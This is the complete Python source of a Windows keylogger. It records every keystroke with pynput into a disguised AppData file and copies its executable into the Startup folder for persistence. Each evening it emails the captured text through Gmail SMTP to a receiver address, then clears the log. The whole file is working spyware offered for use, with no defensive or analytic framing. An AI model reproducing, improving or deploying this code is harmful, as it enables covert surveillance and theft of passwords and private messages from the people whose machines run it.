"""

more functionalities

V: 2021/04

txt sended as string traited and clean

run with system start up

"""

from pynput.keyboard import Key, Listener
import logging
import time
import threading
from threading import Thread
import smtplib
import datetime
import getpass
import os
import shutil

sendedToday = False
#the path disired of your txt_keys file
USER_NAME = getpass.getuser()
log_dir = ("C:/Users/%s/AppData/Systeme.bin"% USER_NAME)
#i save the content in file named Syseme.bin i tested the reading function and it workd fine with .bin files, it's like .txt
#to don't have a probleme with a big size in future , the file get cleaned after sending  the data.
#**************************************************************************************

#the process of sending the msg
def send():
  global sendedToday
  try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("Email To send from", "password")
    server.sendmail("Email To send from", "Email receiver", link())
    server.quit()
    sendedToday = True
    return
  except :
    sendedToday = False
    return
#try to link each carachter in each line in one string
def link():
    global log_dir
    try :
        f = open(log_dir, 'r+')
        buffer = f.read()
        f.close()
    except:
        return ""
    #save only the carachter and some special charachter
    msg = (buffer.replace("'","").replace("\n","").replace("Key.space"," ").replace("Key.caps_lock","^")
           .replace("Key.ctrl_l"," ").replace("Key.backspace","<").replace("Key.right","").replace("Key.left"," ")
           .replace("Key.shift"," ").replace("Key.enter","\n").replace("Key.alt_r","ALTGR").replace("Key.tab","   ").replace("Key.alt_l"," "))
    print(msg)
    msg = Upper(msg)
    msg = backD(msg)
    return msg
#remove the if the key saved was delete
def backD(msg):
    la = [x for x in msg]
    for j in range(len(la)) :
            for i in range(len(la)) :
                    if la[i] =='<':
                            bef = i-1   
                            la.pop(i)
                            la.pop(bef) 
                            break
    return "".join(la)
#make the carachter after the KeyLock as Upper its not so efficient
def Upper(msg):
    la = [x for x in msg]
    count =1
    for j in range(len(la)) :
            count=1
            for i in range(len(la)) :
                    if la[i] =='^':
                           
                               print(la[i])
                               print(la[i-1])
                               bef = i-1
                               la[bef] = la[bef].upper()
                               la.pop(i)
                               break
    return "".join(la)

#start the run methode separatley to don't use more time and memories while sending and typing
#*********************************************************************************************#

#copy the file to somewhere
#basicly it's enough to copy the file to start up
#it' s possible to remove the original file after the process of copying
def save():
    global USER_NAME
    des = ("C:/Users/%s/AppData/values.txt"% USER_NAME)
    try:
        name = open(des,"r+")
        
    except:
        name = open(des,"w+")
        name.write("1")
        
        #copying the file to somewhere (in my case the startup path)

        filePath = os.getcwd()+ '\\' + "keylogv2.exe"
        Des_file = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        shutil.copy2(filePath, Des_file)
    finally:
        name.close()    


#**********************************************"#
def run():
    global log_dir
    while True:
      time.sleep(60*2)
      t = datetime.datetime.today()
      future = datetime.datetime(t.year,t.month,t.day,21,0)
      #if t.hour ==00 and t.minute <12 or t.hour ==00 :
      if t.hour == 22:
          #sendedToday = False
          send()
          if sendedToday == True:
              future += datetime.timedelta(days=1)
              #future = datetime.datetime(t.year,t.month,t.day,,0)
              print((future - t).seconds)
              f = open(log_dir, 'w') 
              f.close()
              time.sleep((future - t).seconds)

#Scope for starting email sending and saving the file
Thread(target = run ).start()
Thread(target = save ).start()
#***********************************************#

# keystroke region
logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(message)s')    
#main function get the key and save it in a file
def on_press(key):
    
     logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
time.sleep(15)
